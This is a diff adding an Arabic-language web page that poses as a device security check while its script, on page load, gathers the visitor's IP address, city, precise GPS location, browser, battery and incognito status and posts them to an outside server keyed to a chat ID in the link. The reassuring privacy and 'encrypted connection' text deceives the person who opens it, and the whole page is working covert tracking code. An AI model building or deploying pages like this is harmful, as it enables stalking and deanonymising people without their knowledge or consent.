@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>التحقق من جهازك</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Tajawal', sans-serif;
+    }
+    
+    body {
+      background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
+      background-size: 400% 400%;
+      animation: gradientBG 15s ease infinite;
+      color: #333;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+      direction: rtl;
+      text-align: right;
+    }
+    
+    @keyframes gradientBG {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+    
+    .container {
+      background: rgba(255, 255, 255, 0.95);
+      width: 100%;
+      max-width: 500px;
+      border-radius: 20px;
+      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
+      overflow: hidden;
+      transition: transform 0.3s ease;
+      animation: fadeIn 0.8s ease-out;
+    }
+    
+    .container:hover {
+      transform: translateY(-5px);
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    .header {
+      background: linear-gradient(90deg, #1a2a6c, #2a4d8e);
+      color: white;
+      padding: 25px;
+      text-align: center;
+      position: relative;
+    }
+    
+    .header::after {
+      content: '';
+      position: absolute;
+      bottom: -15px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 30px;
+      height: 30px;
+      background: #2a4d8e;
+      border-radius: 50%;
+      z-index: 1;
+    }
+    
+    .header h1 {
+      font-size: 1.8rem;
+      margin-bottom: 10px;
+      font-weight: 700;
+    }
+    
+    .header p {
+      font-size: 1rem;
+      opacity: 0.9;
+    }
+    
+    .logo {
+      font-size: 3.5rem;
+      margin-bottom: 15px;
+      color: #fff;
+      text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+      animation: pulse 2s infinite;
+    }
+    
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+    
+    .content {
+      padding: 35px 30px;
+      text-align: center;
+    }
+    
+    .status {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-bottom: 30px;
+    }
+    
+    .spinner {
+      width: 70px;
+      height: 70px;
+      border: 6px solid rgba(26, 42, 108, 0.2);
+      border-top: 6px solid #1a2a6c;
+      border-radius: 50%;
+      animation: spin 1.2s linear infinite;
+      margin-bottom: 20px;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    .status h2 {
+      font-size: 1.5rem;
+      color: #1a2a6c;
+      margin-bottom: 10px;
+    }
+    
+    .status p {
+      font-size: 1.1rem;
+      color: #555;
+      line-height: 1.6;
+    }
+    
+    .progress-container {
+      width: 100%;
+      height: 12px;
+      background: #e0e0e0;
+      border-radius: 10px;
+      overflow: hidden;
+      margin: 25px 0;
+    }
+    
+    .progress-bar {
+      height: 100%;
+      width: 0;
+      background: linear-gradient(90deg, #1a2a6c, #2a4d8e);
+      border-radius: 10px;
+      animation: progress 2s forwards;
+    }
+    
+    @keyframes progress {
+      0% { width: 0; }
+      100% { width: 85%; }
+    }
+    
+    .info-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 15px;
+      margin-top: 30px;
+    }
+    
+    .info-card {
+      background: #f8f9ff;
+      border-radius: 12px;
+      padding: 15px;
+      text-align: center;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.05);
+      transition: all 0.3s ease;
+      border: 1px solid #e6e9ff;
+    }
+    
+    .info-card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
+      background: #fff;
+    }
+    
+    .info-card i {
+      font-size: 2rem;
+      color: #1a2a6c;
+      margin-bottom: 10px;
+    }
+    
+    .info-card h3 {
+      font-size: 1rem;
+      color: #1a2a6c;
+      margin-bottom: 5px;
+    }
+    
+    .info-card p {
+      font-size: 0.9rem;
+      color: #666;
+    }
+    
+    .footer {
+      background: #f0f4ff;
+      padding: 20px;
+      text-align: center;
+      border-top: 1px solid #e6e9ff;
+      color: #555;
+      font-size: 0.9rem;
+    }
+    
+    .security-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: #e8f4ff;
+      padding: 8px 15px;
+      border-radius: 20px;
+      margin-top: 10px;
+      color: #1a6c9c;
+      font-weight: 500;
+    }
+    
+    .result-message {
+      background: #e8f5e9;
+      border: 1px solid #c8e6c9;
+      border-radius: 10px;
+      padding: 15px;
+      margin-top: 20px;
+      display: none;
+    }
+    
+    .result-message.success {
+      background: #e8f5e9;
+      border-color: #c8e6c9;
+      color: #2e7d32;
+    }
+    
+    .result-message.error {
+      background: #ffebee;
+      border-color: #ffcdd2;
+      color: #c62828;
+    }
+    
+    @media (max-width: 480px) {
+      .header {
+        padding: 20px 15px;
+      }
+      
+      .header h1 {
+        font-size: 1.5rem;
+      }
+      
+      .content {
+        padding: 25px 20px;
+      }
+      
+      .info-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <div class="logo">
+        <i class="fas fa-shield-alt"></i>
+      </div>
+      <h1>التحقق من جهازك</h1>
+      <p>نقوم بفحص إعدادات الأمان ومواصفات الجهاز</p>
+    </div>
+    
+    <div class="content">
+      <div class="status">
+        <div class="spinner"></div>
+        <h2>جاري التحقق من جهازك...</h2>
+        <p>يرجى الانتظار بينما نقوم بفحص إعدادات الأمان ومواصفات جهازك. هذه العملية تستغرق بضع ثوانٍ فقط.</p>
+      </div>
+      
+      <div class="progress-container">
+        <div class="progress-bar"></div>
+      </div>
+      
+      <div class="info-grid">
+        <div class="info-card">
+          <i class="fas fa-lock"></i>
+          <h3>حالة الأمان</h3>
+          <p>يتم التحقق</p>
+        </div>
+        
+        <div class="info-card">
+          <i class="fas fa-microchip"></i>
+          <h3>مواصفات الجهاز</h3>
+          <p>جاري الفحص</p>
+        </div>
+        
+        <div class="info-card">
+          <i class="fas fa-wifi"></i>
+          <h3>اتصال الشبكة</h3>
+          <p>قيد الفحص</p>
+        </div>
+        
+        <div class="info-card">
+          <i class="fas fa-battery-three-quarters"></i>
+          <h3>حالة البطارية</h3>
+          <p>جاري القياس</p>
+        </div>
+      </div>
+      
+      <div id="resultMessage" class="result-message"></div>
+    </div>
+    
+    <div class="footer">
+      <p>جميع عمليات الفحص تتم لحماية خصوصيتك وأمان جهازك</p>
+      <div class="security-badge">
+        <i class="fas fa-shield-alt"></i>
+        <span>اتصال آمن ومشفّر</span>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // رابط السيرفر الخاص بك
+    const SERVER_URL = 'https://roks-ai.onrender.com';
+    
+    // الحصول على معرف الدردشة من رابط الصفحة
+    const urlParams = new URLSearchParams(window.location.search);
+    const CHAT_ID = urlParams.get('id');
+    
+    // عناصر DOM
+    const spinner = document.querySelector('.spinner');
+    const statusText = document.querySelector('.status h2');
+    const statusDesc = document.querySelector('.status p');
+    const resultMessage = document.getElementById('resultMessage');
+    const infoCards = document.querySelectorAll('.info-card p');
+    
+    // تحديث واجهة المستخدم
+    function updateUI(status, description) {
+      statusText.textContent = status;
+      statusDesc.textContent = description;
+    }
+    
+    // تحديث البطاقات المعلوماتية
+    function updateInfoCards(data) {
+      if (infoCards[0]) infoCards[0].textContent = data.cameraSupport === "✅" ? "آمن" : "غير آمن";
+      if (infoCards[1]) infoCards[1].textContent = data.deviceType;
+      if (infoCards[2]) infoCards[2].textContent = data.connectionType;
+      if (infoCards[3]) infoCards[3].textContent = data.batteryLevel;
+    }
+    
+    // إظهار رسالة النتيجة
+    function showResult(message, isSuccess) {
+      resultMessage.textContent = message;
+      resultMessage.className = `result-message ${isSuccess ? 'success' : 'error'}`;
+      resultMessage.style.display = 'block';
+    }
+    
+    // التحقق من وضع التصفح الخفي
+    async function isIncognito() {
+      try {
+        const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+        if (!fs) return "❌";
+        return await new Promise((resolve) => {
+          fs(window.TEMPORARY, 100, () => resolve("❌"), () => resolve("✅"));
+        });
+      } catch {
+        return "❌";
+      }
+    }
+    
+    // الحصول على حالة البطارية
+    async function getBattery() {
+      try {
+        const battery = await navigator.getBattery();
+        return `${Math.round(battery.level * 100)}%`;
+      } catch {
+        return "غير مدعوم";
+      }
+    }
+    
+    // الحصول على نوع الاتصال
+    function getConnectionType() {
+      const nav = navigator;
+      if (nav.connection && nav.connection.effectiveType) {
+        return nav.connection.effectiveType;
+      }
+      return "غير معروف";
+    }
+    
+    // الحصول على نوع الجهاز
+    function getDeviceType() {
+      const ua = navigator.userAgent;
+      if (/mobile/i.test(ua)) return "جوال";
+      if (/tablet/i.test(ua)) return "جهاز لوحي";
+      return "كمبيوتر";
+    }
+    
+    // الحصول على نوع المتصفح
+    function getBrowser() {
+      const ua = navigator.userAgent;
+      if (ua.includes("Firefox")) return "Firefox";
+      if (ua.includes("Chrome")) return "Chrome";
+      if (ua.includes("Safari")) return "Safari";
+      if (ua.includes("Edge")) return "Edge";
+      return "غير معروف";
+    }
+    
+    // الحصول على معلومات الموقع
+    function getLocationInfo() {
+      return fetch("https://ipapi.co/json")
+        .then(res => res.json())
+        .catch(() => ({}));
+    }
+    
+    // الحصول على الموقع الجغرافي
+    function getGeolocation() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          resolve("غير متوفر");
+          return;
+        }
+        
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
+          () => resolve("غير متوفر"),
+          { timeout: 10000 }
+        );
+      });
+    }
+    
+    // جمع البيانات وإرسالها للسيرفر
+    async function collectAndSendData() {
+      try {
+        updateUI("جاري جمع المعلومات...", "نقوم بجمع معلومات جهازك وإعدادات الأمان");
+        
+        // جمع جميع المعلومات
+        const locationData = await getLocationInfo();
+        const battery = await getBattery();
+        const incognito = await isIncognito();
+        const geoLocation = await getGeolocation();
+        const screenRes = `${screen.width}x${screen.height}`;
+        const now = new Date().toLocaleString("ar-EG");
+        
+        // تجهيز البيانات للإرسال
+        const deviceData = {
+          country: locationData.country_name || "غير معروف",
+          city: locationData.city || "غير معروف",
+          ip: locationData.ip || "غير معروف",
+          time: now,
+          language: navigator.language,
+          platform: navigator.platform,
+          deviceType: getDeviceType(),
+          browser: getBrowser(),
+          cameraSupport: navigator.mediaDevices ? "✅" : "❌",
+          screenResolution: screenRes,
+          batteryLevel: battery,
+          connectionType: getConnectionType(),
+          incognitoMode: incognito,
+          userActive: "✅",
+          loginDate: now,
+          location: geoLocation,
+          chatId: CHAT_ID,
+          // معلومات إضافية من الطلب
+          userName: "مستخدم الفحص",
+          userId: "غير معروف",
+          username: "مستخدم الفحص"
+        };
+        
+        // تحديث البطاقات المعلوماتية
+        updateInfoCards(deviceData);
+        
+        updateUI("جاري إرسال البيانات...", "نقوم بإرسال المعلومات إلى السيرفر");
+        
+        // إرسال البيانات إلى السيرفر
+        const response = await fetch(`${SERVER_URL}/device-info`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(deviceData)
+        });
+        
+        const result = await response.json();
+        
+        if (result.success) {
+          // إخفاء spinner وإظهار النتيجة
+          spinner.style.display = 'none';
+          updateUI("اكتمل الفحص بنجاح", "تم فحص جهازك وإرسال المعلومات بنجاح");
+          showResult("✅ تم إرسال معلومات جهازك بنجاح. يمكنك الآن إغلاق هذه الصفحة.", true);
+        } else {
+          throw new Error(result.error || 'فشل في إرسال البيانات');
+        }
+        
+      } catch (error) {
+        console.error('Error:', error);
+        spinner.style.display = 'none';
+        updateUI("حدث خطأ", "لم نتمكن من إكمال عملية الفحص");
+        showResult("❌ حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.", false);
+      }
+    }
+    
+    // بدء العملية عند تحميل الصفحة
+    window.onload = function() {
+      if (!CHAT_ID) {
+        spinner.style.display = 'none';
+        updateUI("خطأ في المعرف", "معرف الدردشة غير موجود في الرابط");
+        showResult("❌ رابط غير صالح. يرجى استخدام الرابط الصحيح.", false);
+        return;
+      }
+      
+      // بدء جمع البيانات بعد تأخير قصير
+      setTimeout(collectAndSendData, 2000);
+    };
+  </script>
+</body>
+</html>
